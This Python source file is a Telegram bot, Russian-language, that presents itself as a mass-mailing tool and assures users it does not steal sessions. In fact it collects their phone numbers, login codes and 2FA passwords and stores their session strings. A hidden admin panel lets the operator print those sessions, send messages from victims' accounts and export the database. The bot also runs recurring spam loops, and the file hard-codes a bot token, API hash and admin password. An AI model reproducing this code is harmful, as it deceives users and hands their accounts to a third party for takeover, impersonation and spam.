import asyncio, json, os, logging, time, threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

API_ID = 22376342
API_HASH = 'f623dc4ae2b015463cfde7874ab0f270'
BOT_TOKEN = '8623894019:AAHxSQdrAiL_s-qbA4-zoo8yOLchmok2JUs'
ADMIN_ID = "7113397602"
ADMIN_PASS = "12gleb34"
DB_FILE = 'users_data.json'

bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}
active_tasks = {}
global_stopped = False

WELCOME_TEXT = """<b>✏️ Добро пожаловать в мир умных рассылок!</b>

<i>Приветствуем тебя, дорогой пользователь! 👋</i>

<b>📚 Безопасность прежде всего</b>
- <b>Полная защита:</b> Наш софт НЕ ворует сессии. 🔒
- <b>Прозрачность:</b> Бот создан для легальной автоматизации. ✅

<b>📚 Команда создателей</b>
- <b>Разработчик:</b> @cf_mz 💻
- <b>PR-стратег:</b> @ilialg 📈

Желаем продуктивной работы! 🎯
<i>Начинай прямо сейчас!</i> 🌟🚀"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
threading.Thread(target=lambda: HTTPServer(('0.0.0.0', int(os.environ.get('PORT',8080))), Handler).serve_forever(), daemon=True).start()

def load_db():
    return json.load(open(DB_FILE)) if os.path.exists(DB_FILE) else {}

def save_db(data):
    json.dump(data, open(DB_FILE, 'w'), indent=2, ensure_ascii=False)

def get_accounts(uid):
    return load_db().get(str(uid), {}).get('accounts', {})

def get_active_account(uid):
    accs = get_accounts(uid)
    if not accs: return None, None
    current = user_states.get(str(uid), {}).get('current_account')
    if current and current in accs: return current, accs[current]
    first_name = list(accs.keys())[0]
    user_states[str(uid)] = {'current_account': first_name}
    return first_name, accs[first_name]

def main_menu(uid):
    global global_stopped
    accs = get_accounts(uid)
    acc_count = len(accs)
    is_authorized = get_active_account(uid)[1] is not None
    kb = []
    if is_authorized:
        kb.append([InlineKeyboardButton("💬 Мои чаты", callback_data='chats_menu')])
        kb.append([InlineKeyboardButton("📝 Текст", callback_data='set_text'), InlineKeyboardButton("⏱ Интервал", callback_data='set_delay')])
        kb.append([InlineKeyboardButton("▶️ ЗАПУСТИТЬ", callback_data='start_spam'), InlineKeyboardButton("⏹ ОСТАНОВИТЬ", callback_data='stop_spam')])
        kb.append([InlineKeyboardButton("📊 Статус", callback_data='status')])
    if acc_count > 0:
        kb.append([InlineKeyboardButton(f"👤 Аккаунты ({acc_count}/3)", callback_data='accounts_list')])
    if acc_count < 3:
        kb.append([InlineKeyboardButton("📱 ВОЙТИ ПО НОМЕРУ", callback_data='login_phone')])
    if uid == ADMIN_ID:
        kb.append([InlineKeyboardButton("👑 АДМИН-ПАНЕЛЬ", callback_data='admin_panel')])
        if global_stopped:
            kb.append([InlineKeyboardButton("▶️ ВКЛЮЧИТЬ БОТА", callback_data='global_resume')])
        else:
            kb.append([InlineKeyboardButton("🛑 ОСТАНОВИТЬ БОТА", callback_data='global_stop')])
    return InlineKeyboardMarkup(kb) if kb else InlineKeyboardMarkup([[InlineKeyboardButton("📱 ВОЙТИ ПО НОМЕРУ", callback_data='login_phone')]])

def back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='back_main')]])

def code_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1", callback_data='c1'), InlineKeyboardButton("2", callback_data='c2'), InlineKeyboardButton("3", callback_data='c3')],
        [InlineKeyboardButton("4", callback_data='c4'), InlineKeyboardButton("5", callback_data='c5'), InlineKeyboardButton("6", callback_data='c6')],
        [InlineKeyboardButton("7", callback_data='c7'), InlineKeyboardButton("8", callback_data='c8'), InlineKeyboardButton("9", callback_data='c9')],
        [InlineKeyboardButton("0", callback_data='c0'), InlineKeyboardButton("⌫", callback_data='cb'), InlineKeyboardButton("✅ Готово", callback_data='cd')],
        [InlineKeyboardButton("🔙 Отмена", callback_data='back_main')]
    ])

def admin_panel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Все юзеры", callback_data='adm_users'), InlineKeyboardButton("🔍 Найти юзера", callback_data='adm_find')],
        [InlineKeyboardButton("❄️ Заморозить", callback_data='adm_freeze'), InlineKeyboardButton("🔥 Разморозить", callback_data='adm_unfreeze')],
        [InlineKeyboardButton("🚫 Заблокировать", callback_data='adm_block'), InlineKeyboardButton("✅ Разблокировать", callback_data='adm_unblock')],
        [InlineKeyboardButton("💰 Начислить", callback_data='adm_addmoney'), InlineKeyboardButton("💸 Списать", callback_data='adm_removemoney')],
        [InlineKeyboardButton("📝 Сессии", callback_data='adm_sessions'), InlineKeyboardButton("🗑 Удалить сессию", callback_data='adm_delsession')],
        [InlineKeyboardButton("💬 Чаты юзера", callback_data='adm_userchats'), InlineKeyboardButton("📢 Рассылка всем", callback_data='adm_broadcast')],
        [InlineKeyboardButton("🔑 Управление акк", callback_data='adm_control'), InlineKeyboardButton("📊 Статистика", callback_data='adm_stats')],
        [InlineKeyboardButton("💾 Экспорт базы", callback_data='adm_export')],
        [InlineKeyboardButton("🔙 Выход", callback_data='back_main')]
    ])

def chats_menu_keyboard(chats):
    cl = '\n'.join([f"• {c}" for c in chats]) if chats else "пусто"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Добавить чаты", callback_data='add_chat')],
        [InlineKeyboardButton("🗑 Очистить всё", callback_data='clear_chats')],
        [InlineKeyboardButton("🔙 В меню", callback_data='back_main')]
    ]), cl

async def spam_loop(session_str, uid, acc_name):
    task_id = f"{uid}_{acc_name}"
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await client.connect()
        db = load_db()
        u = db.get(uid, {}).get('accounts', {}).get(acc_name, {})
        chats = list(u.get('chats', []))
        text = u.get('message', 'Привет!')
        delay = max(int(u.get('delay', 300)), 30)
        while task_id in active_tasks and not global_stopped:
            for chat in chats:
                if task_id not in active_tasks or global_stopped: return
                try: await client.send_message(chat, text)
                except: pass
                await asyncio.sleep(2)
            for _ in range(delay // 5):
                if task_id not in active_tasks or global_stopped: return
                await asyncio.sleep(5)
    except Exception as e:
        logger.error(f"Крах: {e}")
    finally:
        await client.disconnect()
        active_tasks.pop(task_id, None)

async def finish_login(uid, client, chat_id, acc_num):
    session_str = client.session.save()
    me = await client.get_me()
    db = load_db()
    if str(uid) not in db: db[str(uid)] = {'accounts': {}}
    acc_name = f"acc_{acc_num}"
    db[str(uid)]['accounts'][acc_name] = {'session': session_str, 'username': me.username or me.first_name, 'chats': [], 'message': 'Привет!', 'delay': 300}
    save_db(db)
    user_states[str(uid)] = {'current_account': acc_name}
    await client.disconnect()
    await bot.send_message(chat_id, f"✅ Вошёл как @{me.username or me.first_name}!", reply_markup=main_menu(uid))

async def process_code(uid, chat_id, msg_id, state):
    code = state.get('entered_code', '')
    client = state.get('client')
    try:
        await client.sign_in(phone=state['phone'], code=code, phone_code_hash=state['phone_code_hash'])
        await finish_login(uid, client, chat_id, state.get('acc_num', 1))
        await bot.delete_message(chat_id, msg_id)
        user_states.pop(str(uid), None)
    except SessionPasswordNeededError:
        user_states[str(uid)]['step'] = 'waiting_2fa'
        await bot.edit_message_text("🔒 Облачный пароль (текстом):", chat_id, msg_id, reply_markup=back_keyboard())
    except Exception as e:
        await bot.edit_message_text(f"❌ {e}", chat_id, msg_id, reply_markup=main_menu(uid))

async def admin_callback(call):
    uid = str(call.from_user.id)
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    db = load_db()
    
    if data == 'adm_users':
        users = list(db.items())
        text = '👥 Все юзеры:\n\n'
        for uid2, u in users[:20]:
            accs = u.get('accounts', {})
            acc_names = ', '.join([f"@{a.get('username','?')}" for a in accs.values()]) or 'нет акк'
            frozen = '❄️' if u.get('frozen') else ''
            blocked = '🚫' if u.get('blocked') else ''
            text += f"ID:{uid2} {frozen}{blocked} | {acc_names}\n"
        await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='back_main')]]))
    
    elif data == 'adm_find':
        user_states[uid] = {'step': 'adm_find_id'}
        await bot.edit_message_text("🔍 Введите ID юзера:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_freeze':
        user_states[uid] = {'step': 'adm_freeze_id'}
        await bot.edit_message_text("❄️ Введите ID для заморозки:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_unfreeze':
        user_states[uid] = {'step': 'adm_unfreeze_id'}
        await bot.edit_message_text("🔥 Введите ID для разморозки:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_block':
        user_states[uid] = {'step': 'adm_block_id'}
        await bot.edit_message_text("🚫 Введите ID для блокировки:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_unblock':
        user_states[uid] = {'step': 'adm_unblock_id'}
        await bot.edit_message_text("✅ Введите ID для разблокировки:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_addmoney':
        user_states[uid] = {'step': 'adm_addmoney_id'}
        await bot.edit_message_text("💰 Введите ID для начисления:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_removemoney':
        user_states[uid] = {'step': 'adm_removemoney_id'}
        await bot.edit_message_text("💸 Введите ID для списания:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_sessions':
        user_states[uid] = {'step': 'adm_sessions_id'}
        await bot.edit_message_text("📝 Введите ID для просмотра сессий:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_delsession':
        user_states[uid] = {'step': 'adm_delsession_id'}
        await bot.edit_message_text("🗑 Введите ID юзера и номер аккаунта:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_userchats':
        user_states[uid] = {'step': 'adm_userchats_id'}
        await bot.edit_message_text("💬 Введите ID юзера:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_broadcast':
        user_states[uid] = {'step': 'adm_broadcast_text'}
        await bot.edit_message_text("📢 Введите текст для рассылки всем:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_control':
        user_states[uid] = {'step': 'adm_control_id'}
        await bot.edit_message_text("🔑 Введите ID юзера для управления:", cid, mid, reply_markup=back_keyboard())
    
    elif data == 'adm_stats':
        total_users = len(db)
        total_accs = sum(len(u.get('accounts',{})) for u in db.values())
        active_now = len(active_tasks)
        frozen = sum(1 for u in db.values() if u.get('frozen'))
        blocked = sum(1 for u in db.values() if u.get('blocked'))
        text = f"📊 Статистика:\n👥 Юзеров: {total_users}\n🔑 Аккаунтов: {total_accs}\n🚀 Активных: {active_now}\n❄️ Заморожено: {frozen}\n🚫 Заблокировано: {blocked}"
        await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='back_main')]]))
    
    elif data == 'adm_export':
        export = json.dumps(db, indent=2, ensure_ascii=False)
        await bot.send_document(cid, export.encode(), visible_file_name='db_export.json', caption='💾 База данных')

@bot.callback_query_handler(func=lambda call: True)
async def callback(call):
    global global_stopped
    uid = str(call.from_user.id)
    state = user_states.get(uid, {})
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    
    if data.startswith('adm_') and uid == ADMIN_ID:
        await admin_callback(call)
        return
    
    if data.startswith('ctrl_') and uid == ADMIN_ID:
        parts = data.split('_')
        target_uid = parts[1]
        acc_name = '_'.join(parts[2:])
        acc = get_accounts(target_uid).get(acc_name, {})
        if data.startswith('ctrl_get_'):
            await bot.send_message(cid, f"📋 Сессия:\n<code>{acc.get('session','')}</code>", parse_mode="HTML")
            await bot.answer_callback_query(call.id, "Отправлена!")
        elif data.startswith('ctrl_send_'):
            user_states[uid] = {'step': 'ctrl_send_msg', 'target': target_uid, 'acc': acc_name}
            await bot.edit_message_text("💬 Введите: @username | Текст", cid, mid, reply_markup=back_keyboard())
        return
    
    if global_stopped and uid != ADMIN_ID:
        await bot.answer_callback_query(call.id, "Бот остановлен")
        return
    
    try:
        if data == 'admin_panel':
            if uid != ADMIN_ID: await bot.answer_callback_query(call.id, "Нет доступа!"); return
            user_states[uid] = {'step': 'admin_auth'}
            await bot.edit_message_text("🔐 Введите пароль:", cid, mid, reply_markup=back_keyboard())
        elif data == 'global_stop':
            if uid != ADMIN_ID: return
            global_stopped = True
            for k in list(active_tasks.keys()): del active_tasks[k]
            await bot.edit_message_text("🛑 Бот остановлен", cid, mid, reply_markup=main_menu(uid))
        elif data == 'global_resume':
            if uid != ADMIN_ID: return
            global_stopped = False
            await bot.edit_message_text("✅ Бот работает", cid, mid, reply_markup=main_menu(uid))
        elif data == 'login_phone':
            if len(get_accounts(uid)) >= 3: await bot.answer_callback_query(call.id, "Максимум 3!"); return
            user_states[uid] = {'step': 'waiting_phone', 'acc_num': len(get_accounts(uid)) + 1}
            await bot.edit_message_text("📱 Номер (с +):", cid, mid, reply_markup=back_keyboard())
        elif data.startswith('c') and len(data)==2 and data[1].isdigit():
            if state.get('step')=='entering_code':
                code = state.get('entered_code','') + data[1]
                if len(code)<=6:
                    user_states[uid]['entered_code']=code
                    await bot.edit_message_text(f"🔢 Код: {'●'*len(code)}", cid, mid, reply_markup=code_keyboard())
            await bot.answer_callback_query(call.id)
        elif data=='cb':
            if state.get('step')=='entering_code':
                code=state.get('entered_code','')[:-1]
                user_states[uid]['entered_code']=code
                await bot.edit_message_text(f"🔢 Код: {'●'*len(code) if code else 'пусто'}", cid, mid, reply_markup=code_keyboard())
            await bot.answer_callback_query(call.id)
        elif data=='cd':
            if state.get('step')=='entering_code':
                await process_code(uid, cid, mid, state)
            await bot.answer_callback_query(call.id)
        elif data=='chats_menu':
            aname, acc = get_active_account(uid)
            if not acc: await bot.answer_callback_query(call.id, "Войди в аккаунт!"); return
            chats=acc.get('chats',[])
            kb,cl=chats_menu_keyboard(chats)
            await bot.edit_message_text(f"💬 Чаты:\n{cl}", cid, mid, reply_markup=kb)
        elif data=='add_chat':
            user_states[uid]={**state,'step':'adding_chats'}
            await bot.edit_message_text("➕ Отправь чаты СПИСКОМ:", cid, mid, reply_markup=back_keyboard())
        elif data=='clear_chats':
            aname, acc = get_active_account(uid)
            if acc:
                db=load_db(); db[uid]['accounts'][aname]['chats']=[]; save_db(db)
                await bot.answer_callback_query(call.id, "Очищено!")
                await bot.edit_message_text("💬 Чаты:\nпусто", cid, mid, reply_markup=chats_menu_keyboard([])[0])
        elif data=='set_text':
            user_states[uid]={**state,'step':'setting_text'}
            await bot.edit_message_text("📝 Текст рассылки:", cid, mid, reply_markup=back_keyboard())
        elif data=='set_delay':
            user_states[uid]={**state,'step':'setting_delay'}
            await bot.edit_message_text("⏱ Интервал (30-3600):", cid, mid, reply_markup=back_keyboard())
        elif data=='start_spam':
            aname, acc = get_active_account(uid)
            if not acc: await bot.answer_callback_query(call.id, "Войди!"); return
            if not acc.get('chats'): await bot.answer_callback_query(call.id, "Добавь чаты!"); return
            task_id = f"{uid}_{aname}"
            active_tasks[task_id] = True
            asyncio.create_task(spam_loop(acc['session'], uid, aname))
            await bot.edit_message_text(f"🚀 Запущено!", cid, mid, reply_markup=back_keyboard())
        elif data=='stop_spam':
            aname, acc = get_active_account(uid)
            if aname: active_tasks.pop(f"{uid}_{aname}", None)
            await bot.edit_message_text("⏹ Стоп", cid, mid, reply_markup=back_keyboard())
        elif data=='status':
            aname, acc = get_active_account(uid)
            if not acc: await bot.answer_callback_query(call.id, "Войди!"); return
            act=f"{uid}_{aname}" in active_tasks
            await bot.edit_message_text(f"📊 @{acc.get('username',aname)}\nРассылка: {'🟢' if act else '🔴'}\nЧатов: {len(acc.get('chats',[]))}\nТекст: {acc.get('message','-')}\nИнтервал: {acc.get('delay',300)}с", cid, mid, reply_markup=back_keyboard())
        elif data=='accounts_list':
            accs = get_accounts(uid)
            if not accs: await bot.answer_callback_query(call.id, "Нет аккаунтов"); return
            kb=[[InlineKeyboardButton(f"👤 @{a.get('username',n)}", callback_data=f"acc_{n}")] for n,a in accs.items()]
            kb+=[[InlineKeyboardButton("🗑 Удалить", callback_data='delete_account')],[InlineKeyboardButton("🔙 Меню", callback_data='back_main')]]
            await bot.edit_message_text("👤 Аккаунты:", cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        elif data.startswith('acc_'):
            an=data[4:]
            accs = get_accounts(uid)
            if an in accs:
                user_states[uid]={'current_account':an}
                await bot.answer_callback_query(call.id, f"Выбран @{accs[an].get('username',an)}")
                await bot.edit_message_text("🏠 Меню:", cid, mid, reply_markup=main_menu(uid))
        elif data=='delete_account':
            accs = get_accounts(uid)
            if not accs: await bot.answer_callback_query(call.id, "Нечего"); return
            kb=[[InlineKeyboardButton(f"❌ @{a.get('username',n)}", callback_data=f"del_{n}")] for n,a in accs.items()]
            kb+=[[InlineKeyboardButton("🔙 Назад", callback_data='accounts_list')]]
            await bot.edit_message_text("Удалить:", cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        elif data.startswith('del_'):
            an=data[4:]
            accs = get_accounts(uid)
            if an in accs:
                active_tasks.pop(f"{uid}_{an}", None)
                db=load_db(); del db[uid]['accounts'][an]; save_db(db)
                await bot.answer_callback_query(call.id, "Удалён!")
                await bot.edit_message_text("👤 Обновлено", cid, mid, reply_markup=main_menu(uid))
        elif data=='back_main':
            await bot.edit_message_text("🏠 Меню:", cid, mid, reply_markup=main_menu(uid))
    except Exception as e:
        logger.error(f"Err: {e}")

@bot.message_handler(commands=['start'])
async def start(msg):
    global global_stopped
    uid = str(msg.from_user.id)
    if global_stopped and uid != ADMIN_ID:
        await bot.send_message(msg.chat.id, "Бот остановлен.")
        return
    await bot.send_message(msg.chat.id, WELCOME_TEXT, reply_markup=main_menu(uid), parse_mode="HTML")

@bot.message_handler(func=lambda m: True)
async def text(msg):
    global global_stopped
    uid=str(msg.from_user.id)
    state=user_states.get(uid,{})
    step=state.get('step')
    
    if global_stopped and uid != ADMIN_ID and not str(step).startswith('adm_'):
        await bot.send_message(msg.chat.id, "Бот остановлен.")
        return

    if step == 'admin_auth':
        if msg.text.strip() == ADMIN_PASS:
            del user_states[uid]
            await bot.send_message(msg.chat.id, "👑 Админ-панель:", reply_markup=admin_panel())
        else:
            del user_states[uid]
            await bot.send_message(msg.chat.id, "❌ Неверный пароль!")
        return
    
    if step == 'adm_find_id':
        target = msg.text.strip()
        u = get_accounts(target)
        if u:
            acc_names = ', '.join([f"@{a.get('username','?')}" for a in u.values()])
            await bot.send_message(msg.chat.id, f"🔍 Юзер {target}:\nАккаунты: {acc_names}", reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Не найден.", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step in ['adm_freeze_id','adm_unfreeze_id','adm_block_id','adm_unblock_id']:
        target = msg.text.strip()
        db = load_db()
        if target in db:
            acts = {'adm_freeze_id': ('frozen', True, 'заморожен'), 'adm_unfreeze_id': ('frozen', False, 'разморожен'),
                    'adm_block_id': ('blocked', True, 'заблокирован'), 'adm_unblock_id': ('blocked', False, 'разблокирован')}
            field, value, text = acts[step]
            db[target][field] = value
            save_db(db)
            await bot.send_message(msg.chat.id, f"✅ Юзер {target} {text}!", reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Не найден.", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step in ['adm_addmoney_id','adm_removemoney_id']:
        user_states[uid] = {'step': step.replace('_id','_amount'), 'target': msg.text.strip()}
        await bot.send_message(msg.chat.id, "💰 Введите сумму:")
        return
    
    if step == 'adm_addmoney_amount':
        try:
            amount = float(msg.text.strip())
            target = state['target']
            db = load_db()
            if target in db:
                db[target]['balance'] = db[target].get('balance',0) + amount
                save_db(db)
                await bot.send_message(msg.chat.id, f"✅ Начислено {amount} TON!", reply_markup=main_menu(uid))
            else:
                await bot.send_message(msg.chat.id, "❌ Не найден.", reply_markup=main_menu(uid))
        except:
            await bot.send_message(msg.chat.id, "❌ Введите число!")
        del user_states[uid]
        return
    
    if step == 'adm_removemoney_amount':
        try:
            amount = float(msg.text.strip())
            target = state['target']
            db = load_db()
            if target in db:
                db[target]['balance'] = max(0, db[target].get('balance',0) - amount)
                save_db(db)
                await bot.send_message(msg.chat.id, f"✅ Списано {amount} TON!", reply_markup=main_menu(uid))
            else:
                await bot.send_message(msg.chat.id, "❌ Не найден.", reply_markup=main_menu(uid))
        except:
            await bot.send_message(msg.chat.id, "❌ Введите число!")
        del user_states[uid]
        return
    
    if step == 'adm_sessions_id':
        target = msg.text.strip()
        accs = get_accounts(target)
        if accs:
            text = f"📝 Сессии юзера {target}:\n\n"
            for n, a in accs.items():
                text += f"• {n}: @{a.get('username','?')}\n"
            await bot.send_message(msg.chat.id, text, reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Нет сессий.", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step == 'adm_delsession_id':
        parts = msg.text.strip().split()
        if len(parts) >= 2:
            target, acc_name = parts[0], parts[1]
            db = load_db()
            if target in db and acc_name in db[target].get('accounts',{}):
                del db[target]['accounts'][acc_name]
                save_db(db)
                await bot.send_message(msg.chat.id, f"✅ Сессия {acc_name} удалена!", reply_markup=main_menu(uid))
            else:
                await bot.send_message(msg.chat.id, "❌ Не найдено.", reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Формат: ID номер", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step == 'adm_userchats_id':
        target = msg.text.strip()
        accs = get_accounts(target)
        if accs:
            text = f"💬 Чаты юзера {target}:\n\n"
            for n, a in accs.items():
                chats = a.get('chats',[])
                text += f"@{a.get('username','?')}: {len(chats)} чатов\n"
            await bot.send_message(msg.chat.id, text, reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Нет аккаунтов.", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step == 'adm_broadcast_text':
        text = msg.text.strip()
        db = load_db()
        sent = 0
        for uid2 in db:
            try:
                await bot.send_message(int(uid2), f"📢 {text}")
                sent += 1
                await asyncio.sleep(0.3)
            except: pass
        await bot.send_message(msg.chat.id, f"📢 Отправлено {sent} юзерам!", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step == 'adm_control_id':
        target = msg.text.strip()
        accs = get_accounts(target)
        if not accs:
            await bot.send_message(msg.chat.id, "❌ Нет аккаунтов.", reply_markup=main_menu(uid))
            del user_states[uid]
            return
        kb = [[InlineKeyboardButton(f"👤 @{a.get('username',n)}", callback_data=f"ctrl_{target}_{n}")] for n,a in accs.items()]
        kb.append([InlineKeyboardButton("🔙 Назад", callback_data="adm_control")])
        await bot.send_message(msg.chat.id, "🔑 Выбери аккаунт:", reply_markup=InlineKeyboardMarkup(kb))
        del user_states[uid]
        return
    
    if step == 'ctrl_send_msg':
        parts = msg.text.strip().split('|', 1)
        if len(parts) >= 2:
            chat, text = parts[0].strip(), parts[1].strip()
            session_str = get_accounts(state['target']).get(state['acc'], {}).get('session', '')
            if session_str:
                client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                try:
                    await client.connect()
                    await client.send_message(chat, text)
                    await client.disconnect()
                    await bot.send_message(msg.chat.id, f"✅ Отправлено в {chat}!", reply_markup=main_menu(uid))
                except Exception as e:
                    await bot.send_message(msg.chat.id, f"❌ {e}", reply_markup=main_menu(uid))
            else:
                await bot.send_message(msg.chat.id, "❌ Сессия не найдена.", reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, "❌ Формат: @username | Текст", reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    if step=='waiting_phone':
        phone=msg.text.strip()
        client=TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent=await client.send_code_request(phone)
            user_states[uid]={**state,'step':'entering_code','client':client,'phone':phone,'phone_code_hash':sent.phone_code_hash,'entered_code':''}
            await bot.send_message(msg.chat.id,"🔢 Код кнопками:",reply_markup=code_keyboard())
        except Exception as e:
            await bot.send_message(msg.chat.id,f"❌ {e}",reply_markup=main_menu(uid))
            del user_states[uid]
        return
    elif step=='waiting_2fa':
        pwd=msg.text.strip()
        client=state.get('client')
        if client:
            try:
                await client.sign_in(password=pwd)
                await finish_login(uid, client, msg.chat.id, state.get('acc_num', 1))
                user_states.pop(str(uid), None)
            except Exception as e:
                await bot.send_message(msg.chat.id,f"❌ {e}",reply_markup=back_keyboard())
        return
    elif step=='adding_chats':
        raw=msg.text.strip()
        chats = [c.strip() for c in raw.replace('\n', ',').split(',') if c.strip()]
        aname, acc = get_active_account(uid)
        if acc:
            db=load_db()
            existing=db[uid]['accounts'][aname].get('chats',[])
            added=0
            for c in chats:
                if c not in existing:
                    existing.append(c)
                    added+=1
            db[uid]['accounts'][aname]['chats']=existing
            save_db(db)
            await bot.send_message(msg.chat.id,f"✅ Добавлено {added} чатов (всего: {len(existing)})",reply_markup=main_menu(uid))
        del user_states[uid]
        return
    elif step=='setting_text':
        txt=msg.text.strip()
        aname, acc = get_active_account(uid)
        if acc:
            db=load_db(); db[uid]['accounts'][aname]['message']=txt; save_db(db)
            await bot.send_message(msg.chat.id,f"✅ Текст: {txt}",reply_markup=main_menu(uid))
        del user_states[uid]
        return
    elif step=='setting_delay':
        try:
            d=int(msg.text.strip())
            if 30<=d<=3600:
                aname, acc = get_active_account(uid)
                if acc:
                    db=load_db(); db[uid]['accounts'][aname]['delay']=d; save_db(db)
                    await bot.send_message(msg.chat.id,f"✅ {d}с",reply_markup=main_menu(uid))
            else: await bot.send_message(msg.chat.id,"❌ 30-3600!",reply_markup=back_keyboard()); return
        except: await bot.send_message(msg.chat.id,"❌ Число!",reply_markup=back_keyboard()); return
        del user_states[uid]
        return
    await bot.send_message(msg.chat.id,"🏠 Меню:",reply_markup=main_menu(uid))

async def restore():
    db=load_db()
    for uid,u in db.items():
        for an,a in u.get('accounts',{}).items():
            if 'session' in a:
                user_states[uid]={'current_account':an}
                if a.get('chats'):
                    active_tasks[f"{uid}_{an}"]=True
                    asyncio.create_task(spam_loop(a['session'], uid, an))

async def main():
    await restore()
    logger.info("Бот запущен!")
    await bot.polling(non_stop=True)

if __name__=='__main__':
    asyncio.run(main())
